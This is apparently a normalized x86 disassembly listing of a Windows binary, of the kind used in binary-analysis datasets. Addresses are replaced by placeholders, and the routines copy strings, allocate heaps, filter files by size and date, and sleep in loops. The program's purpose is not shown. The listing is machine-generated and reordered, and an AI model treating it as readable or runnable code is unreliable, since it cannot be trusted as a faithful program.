sub_40101d
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp + 0xc ]
mov cl [ ebp - 0x1 ]
mov [ eax ] cl
leave
retn
sub_40103d
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
leave
retn
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_401068
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2000
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx eax
call sub_417318
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub_4010a3
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
leave
retn
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx eax
call sub_417232
sub_4010c5
push ebp
mov ebp esp
push 0xffffffff
push sub_423d74
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x10 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410cfd
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
sub_401116
push ebp
mov ebp esp
push 0xffffffff
push sub_423d74
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x10 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410c77
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_4010a3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
sub_401164
push ebp
mov ebp esp
sub esp 0x10
push esi
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x10 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410cc8
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0x4
mov ecx [ ebp - 0x10 ]
call sub_40100f
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
call sub_401000
shr eax 0x2
mov [ ebp - 0x8 ] eax
mov esi [ ebp - 0x10 ]
add esi 0x10
call sub_414299
mov edx esi
mov ecx eax
call sub_410c93
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ecx + eax * 4 ]
movzx eax [ eax + 0x35 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x8 ] eax
js r-xdata
sub_40122e
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax ] 0x0
push 0x40
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_40103d
pop ecx
pop ecx
leave
retn
sub_40124d
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x4 ] ecx
push 0x40
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_40103d
pop ecx
pop ecx
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
cmp eax 0x1f
jbe r-xdata
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0x1f
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x1
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call sub_402b50
add esp 0xc
leave
retn 0x4
sub_4012a4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call [ lstrcmpiW@IAT ]
neg eax
sbb eax eax
inc eax
leave
retn 0x4
sub_4012db
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x8 ] 0x0
push 0x100
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
and [ eax + 0x10c ] 0x0
mov eax [ ebp - 0x4 ]
and [ eax + 0x110 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x114 ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub_40135b
push ebp
mov ebp esp
push 0xffffffff
push sub_423d62
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_401393
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401393
push ebp
mov ebp esp
push 0xffffffff
push sub_423d50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_402fd5
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4013cb
push ebp
mov ebp esp
push 0xffffffff
push sub_423d62
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_40142c
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x18 ]
mov [ eax + 0x18 ] cl
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x1c ]
mov [ eax + 0x1c ] ecx
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40142c
push ebp
mov ebp esp
push 0xffffffff
push sub_423d50
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_402f7d
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ eax + 0x14 ] ecx
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401499
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40135b
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x4
push [ ebp - 0x4 ]
call j_sub_405a68
pop ecx
sub_4014c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401393
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x4
push [ ebp - 0x4 ]
call j_sub_405a68
pop ecx
sub_4014e7
push ebp
mov ebp esp
pop ebp
retn 0x10
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
dec eax
mov [ ebp + 0x10 ] eax
js r-xdata
sub_401525
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor al al
jmp r-xdata
leave
retn
sub_401585
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
leave
retn
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax + 0x35 ]
mov ecx [ ebp + 0xc ]
movzx ecx [ ecx + 0x35 ]
cmp eax ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax + 0x35 ]
mov ecx [ ebp + 0xc ]
movzx ecx [ ecx + 0x35 ]
xor edx edx
cmp eax ecx
setl dl
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
sub ecx [ eax + 0x30 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
sub edx [ eax + 0x30 ]
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
sub ecx [ eax + 0x30 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
sub edx [ eax + 0x30 ]
cmp edx ecx
sbb eax eax
neg eax
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x28 ]
cmp eax [ ecx + 0x28 ]
sbb eax eax
neg eax
mov [ ebp - 0x1 ] al
jmp r-xdata
jmp r-xdata
sub_401661
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
and [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx + 0x4 ]
cmp eax ecx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov al [ ebp - 0x8 ]
leave
retn 0x4
sub_40169b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2000
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
leave
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx eax
call sub_417318
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_4026b0
add esp 0xc
sub_40172a
push ebp
mov ebp esp
push 0xffffffff
push sub_423da6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_40169b
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x10
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_40169b
mov [ ebp - 0x4 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401780
push ebp
mov ebp esp
push 0xffffffff
push sub_423db8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_416bd2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4017b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x4
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2000
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx eax
call sub_417318
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
call sub_414299
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx eax
call sub_417232
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_4026b0
add esp 0xc
sub_40186c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4017b8
mov eax [ ebp + 0x8 ]
add eax 0x10
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x10
call sub_4017b8
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401897
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41cb28
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x40412402
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x927c0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412c9d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_4018db
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40f173
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x40920001
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x32
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0xdbba0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412c9d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_40191f
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_416707
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x40211202
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x50
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x927c0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412c9d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401979
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x80 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov eax [ eax ]
push ecx
call [ eax + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x4 ] eax
sub_4019ba
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
inc eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x80 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x20
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + eax * 4 - 0x4 ] edx
mov al 0x1
xor al al
jmp r-xdata
leave
retn 0x4
sub_4019fd
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40ef13
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x10000301
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x32
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412dc5
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401a3e
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41acaa
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x10212101
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x3c
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412dc5
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401a7f
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40dd83
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x30383201
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x927c0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412fb6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401ac3
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40d86c
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x30290001
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x32
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x124f80
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412fb6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401b07
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_40d3ac
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x30177102
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x50
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x124f80
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412fb6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401b4b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41d319
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x702f3f00
mov eax [ ebp + 0x8 ]
and [ eax + 0x8 ] 0x0
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401b82
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41f4cc
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x74447101
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x5
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401bbc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41c0f9
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x80f80001
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0xa
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412b5d
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401bf6
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41f4aa
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x79339801
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x5
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401c30
push ebp
mov ebp esp
push 0xffffffff
push sub_423d74
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401c6b
push ebp
mov ebp esp
push 0xffffffff
push sub_423d74
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_4010a3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401cfd
push ebp
mov ebp esp
sub esp 0x210
push 0x210
lea eax [ ebp - 0x210 ]
push eax
call sub_40103d
pop ecx
pop ecx
push [ ebp + 0xc ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
add ecx 0x4
call sub_413118
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0xa
shl eax 0xa
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
push 0x3c
pop ecx
div ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
push 0x3c
pop ecx
div ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
push 0x18
pop ecx
div ecx
mov [ ebp - 0x4 ] eax
push 0x210
lea edx [ ebp - 0x210 ]
mov ecx [ ebp + 0x8 ]
call sub_4158b4
leave
retn
sub_401dae
push ebp
mov ebp esp
sub esp 0x20
mov ecx rw-data
call sub_40100f
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x20 ] 0x2800
jae r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x20 ] 0x1e00000
jbe r-xdata
xor al al
jmp r-xdata
leave
retn
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add eax 0x4
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x14 ]
cmp eax 0x7db
jge r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add eax 0x14
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x14 ]
cmp eax 0x7db
jge r-xdata
xor al al
jmp r-xdata
and [ ebp - 0x1c ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ rw-data ]
jge r-xdata
and [ ebp - 0x20 ] 0x0
jmp r-xdata
push [ ebp - 0x1c ]
mov ecx rw-data
call sub_401ccc
push [ eax ]
mov edx [ ebp + 0x10 ]
add edx 0x2c
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ rw-data ]
jge r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
xor al al
push [ ebp - 0x20 ]
mov ecx rw-data
call sub_401ccc
push [ eax ]
mov edx [ ebp + 0x10 ]
add edx 0x2c
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cfd
add esp 0xc
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp + 0x14 ]
push [ eax ]
push rw-data
mov ecx [ ebp + 0x8 ]
call sub_415917
mov [ ebp - 0x4 ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ecx + eax * 4 ]
cmp eax [ edx ]
je r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_401f4c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41bc93
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x70243101
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] 0x64
mov eax [ ebp + 0x8 ]
mov [ eax + 0x114 ] 0x1
call sub_414299
mov edx [ ebp + 0x8 ]
mov ecx eax
call sub_412ae6
mov eax [ ebp - 0x4 ]
leave
retn 0x4
sub_401f90
push ebp
mov ebp esp
sub esp 0x21c
mov [ ebp - 0x21c ] edx
mov [ ebp - 0x218 ] ecx
and [ ebp - 0x210 ] 0x0
push [ ebp - 0x21c ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x20c ] eax
and [ ebp - 0x208 ] 0x0
and [ ebp - 0x214 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x214 ]
cmp eax [ ebp - 0x20c ]
